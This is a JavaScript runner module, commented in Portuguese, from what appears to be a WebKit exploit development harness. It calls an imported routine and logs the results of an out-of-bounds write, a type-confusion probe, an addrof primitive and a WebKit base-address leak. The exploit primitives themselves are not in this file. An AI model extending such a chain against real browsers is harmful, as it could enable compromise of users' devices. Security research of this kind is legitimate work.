// js/script3/runAllAdvancedTestsS3.mjs (Adaptado para TC Controlada + Addrof em M2.payload)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofAndWebKitLeak_R43,
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT
} from './testArrayBufferVictimCrash.mjs';

// Função safeToHexRunner (copiada ou importada de utils.mjs se possível)
function safeToHexRunner(value, length = 8) {
    if (typeof value === 'number') { return '0x' + (value >>> 0).toString(16).padStart(length, '0'); }
    if (value === null || value === undefined) { return String(value); }
    if (typeof value === 'string' && value.startsWith('0x')) { return value; } // Já é hex
    return String(value); // Fallback
}

async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43_TCControl";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    const result = await executeTypedArrayVictimAddrofAndWebKitLeak_R43();

    const module_name_for_title = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;

    if (result.errorOccurred) {
        logS3(`  RUNNER R43(TCControl): Teste principal capturou ERRO: ${String(result.errorOccurred)}`, "critical", FNAME_RUNNER);
        document.title = `${module_name_for_title}: MainTest ERR!`;
    } else if (result) {
        let paramsUsedMsg = 'N/A';
        // O script TCControl usa oob_params_used diretamente no objeto result
        if (result.oob_params_used) {
            paramsUsedMsg = `Offset: ${result.oob_params_used.offset}, Valor: ${result.oob_params_used.value}`;
        } else if (result.oob_value_of_best_result) { // Fallback para compatibilidade
             paramsUsedMsg = `OOB Value (fallback): ${result.oob_value_of_best_result}`;
        }

        logS3(`  RUNNER R43(TCControl): Completou. Parâmetros OOB usados: ${paramsUsedMsg}`, "good", FNAME_RUNNER);
        logS3(`  RUNNER R43(TCControl): Detalhes Sonda TC: ${result.tc_probe_details ? JSON.stringify(result.tc_probe_details) : 'N/A'}`, "leak_detail", FNAME_RUNNER);

        const heisenbugSuccessfullyDetected = result.heisenbug_on_M2_in_best_result; // Usa o campo padrão do runner
        const addrofResult = result.addrof_result; // Resultado principal do addrof
        const webkitLeakResult = result.webkit_leak_result;
        const m2PayloadAddrofDetails = result.m2_payload_addrof_details; // Novo campo do resultado

        logS3(`  RUNNER R43(TCControl): Heisenbug TC Sonda: ${heisenbugSuccessfullyDetected ? "CONFIRMADA" : "NÃO CONFIRMADA"}`, heisenbugSuccessfullyDetected ? "vuln" : "warn", FNAME_RUNNER);

        if (m2PayloadAddrofDetails) {
            logS3(`  RUNNER R43(TCControl): Detalhes da Tentativa de Addrof em M2.payload_ta:`, "info_emphasis", FNAME_RUNNER);
            logS3(`    Notas: ${m2PayloadAddrofDetails.notes}`, m2PayloadAddrofDetails.addrof_on_payload_ta_successful ? "success_major" : "warn", FNAME_RUNNER);
            logS3(`    payload_ta encontrado em M2: ${m2PayloadAddrofDetails.payload_ta_found_in_m2}`, "info", FNAME_RUNNER);
            logS3(`    Addrof em payload_ta bem-sucedido: ${m2PayloadAddrofDetails.addrof_on_payload_ta_successful}`, m2PayloadAddrofDetails.addrof_on_payload_ta_successful ? "vuln" : "info", FNAME_RUNNER);
            if (m2PayloadAddrofDetails.leaked_address_str) {
                logS3(`    Endereço Vazado (M2.payload_ta): ${m2PayloadAddrofDetails.leaked_address_str}`, "leak", FNAME_RUNNER);
            }
        } else {
            logS3(`  RUNNER R43(TCControl): Detalhes da tentativa de Addrof em M2.payload_ta não disponíveis.`, "warn", FNAME_RUNNER);
        }
        
        // Log do resultado geral de addrof (que reflete o sucesso do addrof em M2.payload_ta)
        if (addrofResult) {
             logS3(`  RUNNER R43(TCControl): Resultado Geral Addrof: ${addrofResult.msg} (Endereço: ${addrofResult.leaked_object_addr || 'N/A'})`, addrofResult.success ? "vuln" : "warn", FNAME_RUNNER);
        }

        if (webkitLeakResult) {
            logS3(`  RUNNER R43(TCControl): Teste WebKit Base Leak: ${webkitLeakResult.msg}`, webkitLeakResult.success ? "vuln" : "info", FNAME_RUNNER);
        }

        let finalTitleSegment = "No Notable Result";
        if (addrofResult?.success) { // Usar o addrof_result principal
            finalTitleSegment = "Addrof M2.payload SUCCESS!";
        } else if (heisenbugSuccessfullyDetected) {
            finalTitleSegment = "TC Confirmed, Addrof M2.payload Fail";
        }
        document.title = `${module_name_for_title}_R43_TCControl: ${finalTitleSegment}`;


        if (result.iteration_results_summary && result.iteration_results_summary.length > 0) {
            logS3(`  RUNNER R43(TCControl): Sumário da Iteração (haverá apenas 1):`, "info", FNAME_RUNNER);
            const iter_sum = result.iteration_results_summary[0];
            const tcSuccess = iter_sum.heisenbug_on_M2_confirmed_by_tc_probe;
            const m2AddrofSuccess = iter_sum.m2_payload_addrof_details?.addrof_on_payload_ta_successful;
            let logMsg = `    Iter 1 (OOB ${iter_sum.oob_value}): TC=${tcSuccess}, Addrof(M2.payload)=${m2AddrofSuccess}`;
            if(iter_sum.error) logMsg += `, Err: ${iter_sum.error}`;
            logS3(logMsg, "info", FNAME_RUNNER);
        }

    } else {
        document.title = `${module_name_for_title}_R43_TCControl: Invalid Result Obj`;
    }
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_MainOrchestrator_TCControl`;
    logS3(`==== INICIANDO Script 3 R43_TCControl (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    await runHeisenbugReproStrategy_TypedArrayVictim_R43();
    logS3(`\n==== Script 3 R43_TCControl (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if (runBtn) runBtn.disabled = false;

    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT) &&
        !document.title.includes("SUCCESS") &&
        !document.title.includes("Fail") &&
        !document.title.includes("OK") &&
        !document.title.includes("Confirmed") &&
        !document.title.includes("ERR") &&
        !document.title.includes("Invalid")) {
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT}_R43_TCControl_Done`;
    }
}
